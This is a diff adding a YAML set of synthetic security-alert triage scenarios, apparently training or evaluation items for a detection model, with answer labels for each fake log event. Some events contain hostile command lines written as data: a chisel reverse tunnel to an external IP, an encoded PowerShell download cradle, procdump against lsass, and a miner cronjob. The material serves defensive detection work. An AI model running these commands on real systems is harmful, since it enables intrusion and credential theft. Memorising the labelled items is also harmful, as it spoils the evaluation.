@@ -1,0 +1,599 @@
+# TRAIN-SAFE OOD curriculum — NOT sealed held_out.
+# Different IDs/hosts/narratives from data/blind/held_out/scenarios.yaml.
+# Emphasize: SaaS/IdP/cloud, evidence spans, BTP / FP / needs_more_data.
+
+# --- true_positive cloud / IdP / email ---
+- id: ood-train-okta-session-hijack
+  technique: {id: T1550.004, name: Web Session Cookie, tactic: Defense Evasion, confidence: 0.84}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 82]
+  event:
+    timestamp: "2024-11-01T03:14:00Z"
+    source: okta
+    host: okta-prod
+    user: devon.lee@contoso-train.io
+    raw:
+      eventType: "user.session.start"
+      client_ip: "185.220.101.22"
+      prior_ip: "12.34.56.78"
+      mfa: "not_required"
+      message: "New Okta session for devon.lee@contoso-train.io from Tor exit 185.220.101.22 without MFA step-up"
+    message: "New Okta session for devon.lee@contoso-train.io from Tor exit 185.220.101.22 without MFA step-up"
+  evidence_field: raw.message
+  evidence_value: "from Tor exit 185.220.101.22 without MFA step-up"
+  evidence_why: "Impossible geo + MFA bypass on privileged SaaS session."
+  summary: "Suspicious Okta session likely cookie replay."
+
+- id: ood-train-m365-inbox-rule-hide
+  technique: {id: T1114.003, name: Email Forwarding Rule, tactic: Collection, confidence: 0.86}
+  disposition: true_positive
+  category: collection
+  severity: [high, 84]
+  event:
+    timestamp: "2024-11-02T09:22:00Z"
+    source: other
+    host: m365-train
+    user: payroll@contoso-train.io
+    raw:
+      operation: New-InboxRule
+      name: ".."
+      redirect: "exfil-drop@yandex-team-mail.ru"
+      message: "Hidden inbox rule .. on payroll@contoso-train.io redirects to exfil-drop@yandex-team-mail.ru"
+    message: "Hidden inbox rule .. on payroll@contoso-train.io redirects to exfil-drop@yandex-team-mail.ru"
+  evidence_field: raw.redirect
+  evidence_value: "exfil-drop@yandex-team-mail.ru"
+  evidence_why: "Concealed forward of payroll mailbox."
+  summary: "Malicious hidden mailbox forward on payroll."
+
+- id: ood-train-entra-app-secret
+  technique: {id: T1098.001, name: Additional Cloud Credentials, tactic: Persistence, confidence: 0.88}
+  disposition: true_positive
+  category: persistence
+  severity: [critical, 92]
+  event:
+    timestamp: "2024-11-02T21:05:00Z"
+    source: other
+    host: entra-train
+    user: spn:nightly-ci
+    raw:
+      operation: Add password
+      app: "GraphReporter"
+      message: "nightly-ci added client secret to GraphReporter with Application.ReadWrite.All"
+    message: "nightly-ci added client secret to GraphReporter with Application.ReadWrite.All"
+  evidence_field: raw.message
+  evidence_value: "added client secret to GraphReporter"
+  evidence_why: "New app credential with broad Graph rights."
+  summary: "Entra app secret added by CI SPN."
+
+- id: ood-train-aws-console-login-nokey
+  technique: {id: T1078.004, name: Cloud Accounts, tactic: Initial Access, confidence: 0.8}
+  disposition: true_positive
+  category: initial_access
+  severity: [high, 78]
+  event:
+    timestamp: "2024-11-03T01:40:00Z"
+    source: cloudtrail
+    host: aws-218800
+    user: arn:aws:iam::218800:user/breakglass
+    raw:
+      eventName: ConsoleLogin
+      mfaUsed: "No"
+      sourceIPAddress: "45.155.205.9"
+      message: "ConsoleLogin success for breakglass without MFA from 45.155.205.9"
+    message: "ConsoleLogin success for breakglass without MFA from 45.155.205.9"
+  evidence_field: raw.message
+  evidence_value: "ConsoleLogin success for breakglass without MFA"
+  evidence_why: "Break-glass console login without MFA from rare IP."
+  summary: "AWS console login without MFA on breakglass."
+
+- id: ood-train-s3-exfil-sync
+  technique: {id: T1537, name: Transfer Data to Cloud Account, tactic: Exfiltration, confidence: 0.87}
+  disposition: true_positive
+  category: exfiltration
+  severity: [critical, 93]
+  event:
+    timestamp: "2024-11-03T18:11:00Z"
+    source: cloudtrail
+    host: aws-218800
+    user: arn:aws:iam::218800:user/etl
+    raw:
+      eventName: CopyObject
+      bucket: "contoso-train-finance"
+      dest: "arn:aws:s3:::attacker-collect-881"
+      count: 1204
+      message: "1204 CopyObject from contoso-train-finance to attacker-collect-881 by etl"
+    message: "1204 CopyObject from contoso-train-finance to attacker-collect-881 by etl"
+  evidence_field: raw.message
+  evidence_value: "CopyObject from contoso-train-finance to attacker-collect-881"
+  evidence_why: "Cross-account bulk copy of finance bucket."
+  summary: "S3 cross-account exfiltration by etl user."
+
+- id: ood-train-k8s-cronjob-crypto
+  technique: {id: T1496, name: Resource Hijacking, tactic: Impact, confidence: 0.85}
+  disposition: true_positive
+  category: impact
+  severity: [high, 80]
+  event:
+    timestamp: "2024-11-04T04:02:00Z"
+    source: other
+    host: gke-train-1
+    user: system:serviceaccount:default:default
+    raw:
+      verb: create
+      object: "cronjobs/xmrig-side"
+      image: "docker.io/xmrig/xmrig:latest"
+      message: "Created cronjob xmrig-side pulling docker.io/xmrig/xmrig:latest"
+    message: "Created cronjob xmrig-side pulling docker.io/xmrig/xmrig:latest"
+  evidence_field: raw.image
+  evidence_value: "docker.io/xmrig/xmrig:latest"
+  evidence_why: "Known miner image scheduled as CronJob."
+  summary: "K8s cronjob deploying cryptominer image."
+
+- id: ood-train-github-pat-push
+  technique: {id: T1552.001, name: Credentials In Files, tactic: Credential Access, confidence: 0.83}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 81]
+  event:
+    timestamp: "2024-11-04T16:30:00Z"
+    source: other
+    host: github-enterprise
+    user: devops-bot
+    raw:
+      repo: "contoso-train/infra"
+      path: "terraform/secrets.auto.tfvars"
+      message: "Secret scanning: GitHub PAT ghp_ in terraform/secrets.auto.tfvars pushed by devops-bot"
+    message: "Secret scanning: GitHub PAT ghp_ in terraform/secrets.auto.tfvars pushed by devops-bot"
+  evidence_field: raw.message
+  evidence_value: "GitHub PAT ghp_ in terraform/secrets.auto.tfvars"
+  evidence_why: "Live PAT committed to infra repo."
+  summary: "GitHub PAT leaked in terraform vars."
+
+- id: ood-train-slack-token-exfil
+  technique: {id: T1530, name: Data from Cloud Storage, tactic: Collection, confidence: 0.8}
+  disposition: true_positive
+  category: collection
+  severity: [high, 77]
+  event:
+    timestamp: "2024-11-05T11:08:00Z"
+    source: other
+    host: slack-audit
+    user: U0TRAIN99
+    raw:
+      action: "file_downloaded"
+      count: 310
+      workspace: "contoso-train"
+      message: "User U0TRAIN99 downloaded 310 files from #legal-mna in 8 minutes"
+    message: "User U0TRAIN99 downloaded 310 files from #legal-mna in 8 minutes"
+  evidence_field: raw.message
+  evidence_value: "downloaded 310 files from #legal-mna"
+  evidence_why: "Burst download of sensitive Slack channel files."
+  summary: "Mass Slack file collection from legal channel."
+
+- id: ood-train-vpn-cert-steal
+  technique: {id: T1649, name: Steal or Forge Authentication Certificates, tactic: Credential Access, confidence: 0.82}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 79]
+  event:
+    timestamp: "2024-11-05T22:45:00Z"
+    source: sysmon
+    host: laptop-ood-77
+    user: mchen
+    raw:
+      EventID: 11
+      TargetFilename: "C:\\Users\\mchen\\AppData\\Roaming\\OpenVPN\\config\\corp.ovpn"
+      Image: "C:\\Users\\mchen\\Downloads\\steal.exe"
+      message: "steal.exe wrote copy of corp.ovpn to Temp\\vpn-steal.ovpn"
+    message: "steal.exe wrote copy of corp.ovpn to Temp\\vpn-steal.ovpn"
+  evidence_field: raw.message
+  evidence_value: "wrote copy of corp.ovpn to Temp\\vpn-steal.ovpn"
+  evidence_why: "VPN profile duplicated by unknown binary."
+  summary: "VPN config theft from user laptop."
+
+- id: ood-train-o365-oauth-device
+  technique: {id: T1528, name: Steal Application Access Token, tactic: Credential Access, confidence: 0.84}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 85]
+  event:
+    timestamp: "2024-11-06T08:15:00Z"
+    source: other
+    host: entra-train
+    user: sales@contoso-train.io
+    raw:
+      app: "emClient"
+      permissions: "Mail.ReadWrite offline_access"
+      message: "Device code auth completed for sales@contoso-train.io to emClient from IP 91.132.44.8"
+    message: "Device code auth completed for sales@contoso-train.io to emClient from IP 91.132.44.8"
+  evidence_field: raw.message
+  evidence_value: "Device code auth completed for sales@contoso-train.io to emClient"
+  evidence_why: "Device-code phishing pattern to mail client."
+  summary: "Suspicious OAuth device-code grant for mail."
+
+- id: ood-train-rdp-tunnel-chisel
+  technique: {id: T1572, name: Protocol Tunneling, tactic: Command and Control, confidence: 0.85}
+  disposition: true_positive
+  category: command_and_control
+  severity: [high, 80]
+  event:
+    timestamp: "2024-11-06T19:50:00Z"
+    source: sysmon
+    host: jump-ood-3
+    user: ops
+    raw:
+      EventID: 1
+      Image: "C:\\Users\\ops\\tools\\chisel.exe"
+      CommandLine: "chisel.exe client 203.0.113.9:8080 R:socks"
+      message: "chisel.exe client 203.0.113.9:8080 R:socks"
+    message: "chisel.exe client 203.0.113.9:8080 R:socks"
+  evidence_field: raw.CommandLine
+  evidence_value: "chisel.exe client 203.0.113.9:8080 R:socks"
+  evidence_why: "Chisel reverse SOCKS tunnel to external host."
+  summary: "Protocol tunneling via chisel SOCKS."
+
+- id: ood-train-ldap-asrep
+  technique: {id: T1558.004, name: AS-REP Roasting, tactic: Credential Access, confidence: 0.86}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 83]
+  event:
+    timestamp: "2024-11-07T02:10:00Z"
+    source: windows_security
+    host: dc-ood-01
+    user: CORP\\svc_scan
+    raw:
+      EventID: 4768
+      TicketOptions: "0x40800000"
+      PreAuthType: 0
+      message: "Kerberos TGT without preauth for CORP\\svc_scan from 10.9.9.9"
+    message: "Kerberos TGT without preauth for CORP\\svc_scan from 10.9.9.9"
+  evidence_field: raw.message
+  evidence_value: "Kerberos TGT without preauth for CORP\\svc_scan"
+  evidence_why: "AS-REP roastable account requested without preauth."
+  summary: "AS-REP roasting attempt against svc_scan."
+
+# --- benign_true_positive ---
+- id: ood-train-btp-jamf-script
+  technique: {id: T1059.004, name: Unix Shell, tactic: Execution, confidence: 0.3}
+  disposition: benign_true_positive
+  category: execution
+  severity: [low, 15]
+  event:
+    timestamp: "2024-11-08T10:00:00Z"
+    source: other
+    host: mac-fleet-ood
+    user: root
+    raw:
+      ParentImage: "/usr/local/jamf/bin/jamf"
+      CommandLine: "/bin/bash /Library/Application Support/JAMF/tmp/policy.sh"
+      message: "Jamf policy.sh executed via jamf binary on mac-fleet-ood"
+    message: "Jamf policy.sh executed via jamf binary on mac-fleet-ood"
+  evidence_field: raw.ParentImage
+  evidence_value: "/usr/local/jamf/bin/jamf"
+  evidence_why: "MDM management parent; expected fleet policy."
+  summary: "Jamf MDM script — benign true positive."
+
+- id: ood-train-btp-intune-ps
+  technique: {id: T1059.001, name: PowerShell, tactic: Execution, confidence: 0.28}
+  disposition: benign_true_positive
+  category: execution
+  severity: [low, 16]
+  event:
+    timestamp: "2024-11-08T10:05:00Z"
+    source: sysmon
+    host: win-fleet-ood
+    user: SYSTEM
+    raw:
+      ParentImage: "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\Microsoft.Management.Services.IntuneWindowsAgent.exe"
+      CommandLine: "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\AgentExecutor.ps1"
+      message: "Intune agent executed AgentExecutor.ps1"
+    message: "Intune agent executed AgentExecutor.ps1"
+  evidence_field: raw.ParentImage
+  evidence_value: "IntuneWindowsAgent.exe"
+  evidence_why: "Intune management extension parent."
+  summary: "Intune PowerShell remediation — benign true positive."
+
+- id: ood-train-btp-crowdstrike-update
+  technique: {id: T1105, name: Ingress Tool Transfer, tactic: Command and Control, confidence: 0.25}
+  disposition: benign_true_positive
+  category: command_and_control
+  severity: [informational, 12]
+  event:
+    timestamp: "2024-11-08T11:00:00Z"
+    source: sysmon
+    host: wkstn-ood-5
+    user: SYSTEM
+    raw:
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      CommandLine: "powershell.exe -Command Invoke-WebRequest https://dl.crowdstrike.com/channel/update"
+      message: "CrowdStrike channel update download via Invoke-WebRequest"
+    message: "CrowdStrike channel update download via Invoke-WebRequest"
+  evidence_field: raw.CommandLine
+  evidence_value: "https://dl.crowdstrike.com/channel/update"
+  evidence_why: "Vendor update CDN; allowlisted sensor update."
+  summary: "CrowdStrike update fetch — benign true positive."
+
+- id: ood-train-btp-okta-known-travel
+  technique: {id: T1078.004, name: Cloud Accounts, tactic: Initial Access, confidence: 0.3}
+  disposition: benign_true_positive
+  category: initial_access
+  severity: [low, 20]
+  event:
+    timestamp: "2024-11-08T12:00:00Z"
+    source: okta
+    host: okta-prod
+    user: exec@contoso-train.io
+    raw:
+      city: "London"
+      ticket: "TRAVEL-8891"
+      mfa: "okta_verify"
+      message: "Okta login exec@contoso-train.io from London with MFA covered by TRAVEL-8891"
+    message: "Okta login exec@contoso-train.io from London with MFA covered by TRAVEL-8891"
+  evidence_field: raw.message
+  evidence_value: "covered by TRAVEL-8891"
+  evidence_why: "Pre-approved executive travel ticket."
+  summary: "Okta geo change with travel ticket — benign true positive."
+
+- id: ood-train-btp-terraform-plan
+  technique: {id: T1078.004, name: Cloud Accounts, tactic: Persistence, confidence: 0.25}
+  disposition: benign_true_positive
+  category: persistence
+  severity: [low, 18]
+  event:
+    timestamp: "2024-11-08T13:00:00Z"
+    source: cloudtrail
+    host: aws-218800
+    user: arn:aws:sts::218800:assumed-role/terraform-ci/run-441
+    raw:
+      eventName: CreateUser
+      userName: "tmp-ci-runner-441"
+      message: "terraform-ci CreateUser tmp-ci-runner-441 in pipeline run-441"
+    message: "terraform-ci CreateUser tmp-ci-runner-441 in pipeline run-441"
+  evidence_field: raw.message
+  evidence_value: "terraform-ci CreateUser tmp-ci-runner-441"
+  evidence_why: "Ephemeral CI role creating runner user per pipeline."
+  summary: "Terraform CI IAM user create — benign true positive."
+
+# --- false_positive ---
+- id: ood-train-fp-defender-rtp
+  technique: {id: T1059.001, name: PowerShell, tactic: Execution, confidence: 0.15}
+  disposition: false_positive
+  category: execution
+  severity: [informational, 8]
+  event:
+    timestamp: "2024-11-09T06:00:00Z"
+    source: sysmon
+    host: wkstn-ood-9
+    user: SYSTEM
+    raw:
+      ParentImage: "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+      CommandLine: "powershell.exe -NoProfile -Command Get-MpThreatDetection"
+      message: "MsMpEng spawned Get-MpThreatDetection"
+    message: "MsMpEng spawned Get-MpThreatDetection"
+  evidence_field: raw.ParentImage
+  evidence_value: "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+  evidence_why: "Built-in Defender engine query — noisy FP."
+  summary: "Defender PowerShell status query — false positive."
+
+- id: ood-train-fp-ssl-inspection
+  technique: {id: T1557, name: Adversary-in-the-Middle, tactic: Collection, confidence: 0.2}
+  disposition: false_positive
+  category: collection
+  severity: [informational, 10]
+  event:
+    timestamp: "2024-11-09T07:00:00Z"
+    source: suricata
+    host: proxy-ood
+    raw:
+      alert: "TLS MITM certificate"
+      issuer: "Contoso Train TLS Intercept CA"
+      message: "TLS intercept by Contoso Train TLS Intercept CA on proxy-ood"
+    message: "TLS intercept by Contoso Train TLS Intercept CA on proxy-ood"
+  evidence_field: raw.issuer
+  evidence_value: "Contoso Train TLS Intercept CA"
+  evidence_why: "Corporate SSL inspection CA — expected."
+  summary: "Enterprise TLS intercept — false positive."
+
+- id: ood-train-fp-netbackup
+  technique: {id: T1560.001, name: Archive via Utility, tactic: Collection, confidence: 0.2}
+  disposition: false_positive
+  category: collection
+  severity: [informational, 9]
+  event:
+    timestamp: "2024-11-09T08:00:00Z"
+    source: sysmon
+    host: backup-ood-1
+    user: backupsvc
+    raw:
+      Image: "C:\\Program Files\\Veritas\\NetBackup\\bin\\bpbkar32.exe"
+      CommandLine: "bpbkar32.exe -c D:\\Shares\\Finance"
+      message: "NetBackup bpbkar32 archiving D:\\Shares\\Finance"
+    message: "NetBackup bpbkar32 archiving D:\\Shares\\Finance"
+  evidence_field: raw.Image
+  evidence_value: "C:\\Program Files\\Veritas\\NetBackup\\bin\\bpbkar32.exe"
+  evidence_why: "Scheduled backup agent."
+  summary: "NetBackup archive job — false positive."
+
+# --- needs_more_data ---
+- id: ood-train-nmd-rare-saas-login
+  technique: {id: T1078.004, name: Cloud Accounts, tactic: Initial Access, confidence: 0.4}
+  disposition: needs_more_data
+  category: initial_access
+  severity: [medium, 42]
+  event:
+    timestamp: "2024-11-10T05:20:00Z"
+    source: okta
+    host: okta-prod
+    user: analyst@contoso-train.io
+    raw:
+      city: "Warsaw"
+      mfa: "success"
+      message: "Okta MFA success for analyst@contoso-train.io from Warsaw (first time city)"
+    message: "Okta MFA success for analyst@contoso-train.io from Warsaw (first time city)"
+  evidence_field: raw.message
+  evidence_value: "from Warsaw (first time city)"
+  evidence_why: "New city but MFA ok — need device posture / VPN context."
+  summary: "First-seen city Okta login; needs more data."
+
+- id: ood-train-nmd-single-whoami
+  technique: {id: T1033, name: System Owner/User Discovery, tactic: Discovery, confidence: 0.35}
+  disposition: needs_more_data
+  category: discovery
+  severity: [informational, 18]
+  event:
+    timestamp: "2024-11-10T14:00:00Z"
+    source: sysmon
+    host: wkstn-ood-2
+    user: jdoe
+    raw:
+      EventID: 1
+      CommandLine: "whoami.exe /all"
+      message: "whoami.exe /all"
+    message: "whoami.exe /all"
+  evidence_field: raw.CommandLine
+  evidence_value: "whoami.exe /all"
+  evidence_why: "Single discovery command without parent context."
+  summary: "Isolated whoami; needs more telemetry."
+
+- id: ood-train-nmd-azure-role-read
+  technique: {id: T1087.004, name: Cloud Account, tactic: Discovery, confidence: 0.4}
+  disposition: needs_more_data
+  category: discovery
+  severity: [low, 25]
+  event:
+    timestamp: "2024-11-10T15:30:00Z"
+    source: other
+    host: entra-train
+    user: helpdesk@contoso-train.io
+    raw:
+      operation: List users
+      message: "helpdesk@contoso-train.io listed Entra users via Graph"
+    message: "helpdesk@contoso-train.io listed Entra users via Graph"
+  evidence_field: raw.message
+  evidence_value: "listed Entra users via Graph"
+  evidence_why: "May be normal helpdesk — need role baseline."
+  summary: "Entra user list by helpdesk; needs more data."
+
+- id: ood-train-nmd-dns-long-label
+  technique: {id: T1071.004, name: DNS, tactic: Command and Control, confidence: 0.4}
+  disposition: needs_more_data
+  category: command_and_control
+  severity: [medium, 45]
+  event:
+    timestamp: "2024-11-10T16:00:00Z"
+    source: zeek
+    host: dns-ood
+    raw:
+      query: "status.check.officecdn-microsoft-train.net"
+      message: "TXT query status.check.officecdn-microsoft-train.net from 10.8.8.8"
+    message: "TXT query status.check.officecdn-microsoft-train.net from 10.8.8.8"
+  evidence_field: raw.query
+  evidence_value: "status.check.officecdn-microsoft-train.net"
+  evidence_why: "Could be CDN health check or tunnel — need volume/entropy."
+  summary: "Ambiguous DNS TXT to CDN-like name; needs more data."
+
+# --- more TP endpoint with clear evidence ---
+- id: ood-train-ps-encoded-finance
+  technique: {id: T1059.001, name: PowerShell, tactic: Execution, confidence: 0.9}
+  disposition: true_positive
+  category: execution
+  severity: [critical, 90]
+  event:
+    timestamp: "2024-11-11T09:00:00Z"
+    source: sysmon
+    host: finance-ood-1
+    user: svc_recon
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      CommandLine: "powershell.exe -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+      message: "powershell.exe -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+    message: "powershell.exe -NoP -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+  evidence_field: raw.CommandLine
+  evidence_value: "powershell.exe -NoP -Enc"
+  evidence_why: "Encoded PowerShell on finance host."
+  summary: "Encoded PowerShell download cradle on finance."
+
+- id: ood-train-procdump-lsass
+  technique: {id: T1003.001, name: LSASS Memory, tactic: Credential Access, confidence: 0.92}
+  disposition: true_positive
+  category: credential_access
+  severity: [critical, 95]
+  event:
+    timestamp: "2024-11-11T09:20:00Z"
+    source: sysmon
+    host: dc-ood-02
+    user: admin_ood
+    raw:
+      EventID: 10
+      TargetImage: "C:\\Windows\\System32\\lsass.exe"
+      SourceImage: "C:\\Tools\\procdump64.exe"
+      message: "procdump64.exe accessed lsass.exe"
+    message: "procdump64.exe accessed lsass.exe"
+  evidence_field: raw.SourceImage
+  evidence_value: "C:\\Tools\\procdump64.exe"
+  evidence_why: "Credential dump tool targeting LSASS."
+  summary: "LSASS dump via procdump."
+
+- id: ood-train-impacket-smbexec
+  technique: {id: T1021.002, name: SMB/Windows Admin Shares, tactic: Lateral Movement, confidence: 0.88}
+  disposition: true_positive
+  category: lateral_movement
+  severity: [high, 86]
+  event:
+    timestamp: "2024-11-11T10:00:00Z"
+    source: windows_security
+    host: dc-ood-02
+    user: CORP\\admin_ood
+    raw:
+      EventID: 5140
+      ShareName: "\\\\*\\ADMIN$"
+      IpAddress: "10.9.9.44"
+      message: "ADMIN$ access from 10.9.9.44 followed by service install BTOBTO"
+    message: "ADMIN$ access from 10.9.9.44 followed by service install BTOBTO"
+  evidence_field: raw.message
+  evidence_value: "ADMIN$ access from 10.9.9.44 followed by service install BTOBTO"
+  evidence_why: "Impacket-style admin share + service."
+  summary: "SMBEXEC-like lateral movement."
+
+- id: ood-train-scheduled-at
+  technique: {id: T1053.002, name: At, tactic: Persistence, confidence: 0.8}
+  disposition: true_positive
+  category: persistence
+  severity: [medium, 60]
+  event:
+    timestamp: "2024-11-11T11:00:00Z"
+    source: sysmon
+    host: wkstn-ood-11
+    user: jdoe
+    raw:
+      CommandLine: "at.exe 14:00 C:\\Users\\jdoe\\AppData\\Local\\Temp\\run.bat"
+      message: "at.exe 14:00 C:\\Users\\jdoe\\AppData\\Local\\Temp\\run.bat"
+    message: "at.exe 14:00 C:\\Users\\jdoe\\AppData\\Local\\Temp\\run.bat"
+  evidence_field: raw.CommandLine
+  evidence_value: "at.exe 14:00 C:\\Users\\jdoe\\AppData\\Local\\Temp\\run.bat"
+  evidence_why: "Legacy at job pointing to user Temp."
+  summary: "Persistence via at.exe Temp payload."
+
+- id: ood-train-reg-run-ood
+  technique: {id: T1547.001, name: Registry Run Keys / Startup Folder, tactic: Persistence, confidence: 0.84}
+  disposition: true_positive
+  category: persistence
+  severity: [high, 72]
+  event:
+    timestamp: "2024-11-11T12:00:00Z"
+    source: sysmon
+    host: wkstn-ood-12
+    user: jdoe
+    raw:
+      EventID: 13
+      TargetObject: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TrayService"
+      Details: "C:\\Users\\jdoe\\AppData\\Roaming\\tray.exe"
+      message: "Registry Run TrayService -> tray.exe"
+    message: "Registry Run TrayService -> tray.exe"
+  evidence_field: raw.TargetObject
+  evidence_value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TrayService"
+  evidence_why: "User Run key to AppData binary."
+  summary: "Run-key persistence to tray.exe."
